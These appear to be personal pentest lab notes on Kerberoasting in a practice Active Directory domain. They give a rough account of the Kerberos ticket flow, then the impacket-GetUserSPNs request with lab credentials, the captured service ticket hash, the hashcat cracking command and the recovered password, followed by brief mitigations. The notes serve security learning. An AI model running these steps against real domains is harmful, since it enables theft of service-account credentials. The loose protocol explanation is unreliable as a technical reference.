**Kerberoasting**
How Kerberose works as described by a monkey<br/>
<br/>
1. User requests a Ticket Granting Ticket (TGT) from domain control. Provides NTLM hash<br/>
2. DC provides TGT with krbtgt hash. Provides as NTLM is valid<br/>
3. user reuests Ticket Gratning Service (TGS) ticket. presents DC with the previoulsy optained TGT<br/>
4. Server returns the TGS encryopted with the applications account hash<br/>
<br/>
5. user presents TGS to applications<br/>
6. application grants access.<br/>
<br/>
The attack happens at step 4. The user (victim) can legitmatly request teh TGS. This can then be taken off line by the atacker and decrypted as it is a hash. HASHCAT<br/>
<br/>
<br/>
ATTACK<br/>
<br/>
┌──(kali㉿kali)-[~]<br/>
└─$ sudo impacket-GetUserSPNs marvel.local/lhowlette:Password1 -dc-ip 192.168.247.133 -request                  2 ⨯<br/>
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation<br/>
<br/>
ServicePrincipalName          Name    MemberOf                           PasswordLastSet       LastLogon Delegation <br/>
------------------------------------- ---------- ----------------------------------------------------------- -------------------------- --------- ----------<br/>
XMEN-DC/SQLService.MARVEL.local:60111 SQLService CN=Group Policy Creator Owners,OU=Groups,DC=MARVEL,DC=local 2022-02-14 06:15:07.837485 &lt;never&gt;        <br/>
<br/>
<br/>
<br/>
<b>$krb5tgs$23$</b>*SQLService$MARVEL.LOCAL$marvel.local/SQLService*$83b2b1e28c55da0701a429e1a9fbdf81$2e131d6d8555a93408f241c8275f48f087165f2bb5b56eae19ef7e259a069efa195fdb42ca8f11358f7e93cd2337862cfff<br/>
1382cef60f6dd77f505f9fb93d7a7457c1ccd8dd512e9b4a9b9f2c2c6f8766d0df0682c7bafc01d0d85723aa8beb6c99fc12<br/>
71e9b160b996bdd0c6c189f2b45ca4924051d59756a87b32573394a8f7d64d8745639b299ddbe62754fae90f5df6528fa5<br/>
ca77223160e8dba1d727fe32a2f33bac5becf9b418bedd195760f09229d674cc1beefbcc1160af50eff97713ead63f96a686<br/>
d64e753adcd59e10cab90a4009251c99e2e8d40dac0d414cd60f6473d293fd2d5ecd433ee4aeb6f34de9ff88ce43df3b918<br/>
1008c0aa8a4bfb238757d8a7dcc656c2e8fd364129ba0f5d70499ff50f3d1d0619cf25bf30cab9356eb9d2534b2b6b250801<br/>
7d01f6e778c2c8239f35c65426545cd829fda339af85077876eca859cae061ad12d58ed482136b56227abb374ecb6256559<br/>
d28258558dffbdface3a3cdb9ee7931b376d07c13dd7e912a2560c4edb689ae1c8ec9bc9e714719a8a5d09aff93ae8d20bd<br/>
3fcfe3dac90b78bef879c835cc651e07c99749a51d97a18fbbd75c58ad099ae3d45179f7a7053a956cd2cca1529a1e17069c<br/>
3da79c95b3bc6a9f47bfa69d9e082be4c93bc29adac27f891f0e9aa8ea5c00c8b7df3efb7e6dd2e72fa7def8296c81272918eb<br/>
2e18be7eb591404ca9a6eebfa06a73ad5e5fa3ac01eea5734d7d5cdf8def8bfd27762f131c6b7ecac476fb9ae3cfebb98f5cba8d<br/>
7e511449ade2abe64c3e1b5b4f5062ad8aaf7d4713fb7e9fadf9ffa46d7f5cd3e14a67caa26cdf683984744be6d889f67656f9a0<br/>
3741b16e737def2a2f866267e584a654fbd4786988975c532d0aa2aaa8cad2a823bd14d689f5d75a866fa34c3d51573011f67<br/>
5d22c6c443df1826663e364a2996f5239568eda4dab2e253d66c0e70745abf04909df96fde94cf2fd2eeef96c1843e7aa1028f<br/>
72bca7c19da34ed86e18dc6931d4b1d3991b9d4fd4796f545682a43180946555e7c336b4626262f7a22375479fc227e440f<br/>
7f7c0bb594b4cc2f9db2e4d13c679de88419b17c52ce160675bc58a81738cbc6c8ff7f67bb2614b7442ec52e30017f9f36894<br/>
70459e533f2e401ca1e1a5b44abc2ecc1b6106c48e1106aaae2acb6b2283f57d029498d0a683731c924cb0057528dddfe3<br/>
f6f9f5cdbb0b346f39f313a7900060dccd561aa32a6162e540dc87b8ba1d35bb5ce087593b15c296f3f4de97acbb01fcd7821e<br/>
62f20a5844ec87e2515d91692b899d0f756110a6e3e473601aaac581e81cbcff6959e84981cbcf1367dcc4fc156e80da4a755<br/>
7c0720b7					&gt;&gt;&gt;NOTE&gt;&gt;&gt; Hash broken to fit page&lt;&lt;&lt;&lt;<br/>
                                                              <br/>
┌──(kali㉿kali)-[~]<br/>
└─$ <br/>
<br/>
paste the hash into a text file<br/>
<br/>
┌──(kali㉿kali)-[~]<br/>
└─$ hashcat --help | grep Kerberos                                                1 ⨯<br/>
 19600 | Kerberos 5, etype 17, TGS-REP            | Network Protocol<br/>
 19800 | Kerberos 5, etype 17, Pre-Auth           | Network Protocol<br/>
 19700 | Kerberos 5, etype 18, TGS-REP            | Network Protocol<br/>
 19900 | Kerberos 5, etype 18, Pre-Auth           | Network Protocol<br/>
 7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth        | Network Protocol<br/>
<b> 13100 | Kerberos 5, etype 23, TGS-REP</b>           | Network Protocol<br/>
 18200 | Kerberos 5, etype 23, AS-REP            | Network Protocol<br/>
<br/>
<br/>
hashcat -m 13100 hashes /usr/share/wordlists/rockyou.txt --force <br/>
<br/>
14 Char password &gt; still cracked<br/>
<br/>
$krb5tgs$23$*<b>SQLService$MARVEL.LOCAL$marvel.local/SQLService*$</b><br/>
MYpassword123#<br/>
<br/>
<br/>
<br/>
MITEGATIONS<br/>
<br/>
This is a feature that is being abused. very limited mitegations<br/>
<br/>
STRONG PASSSWORD<br/>
<br/>
least priviledge!<br/>
<br/>
<br/>
<br/>
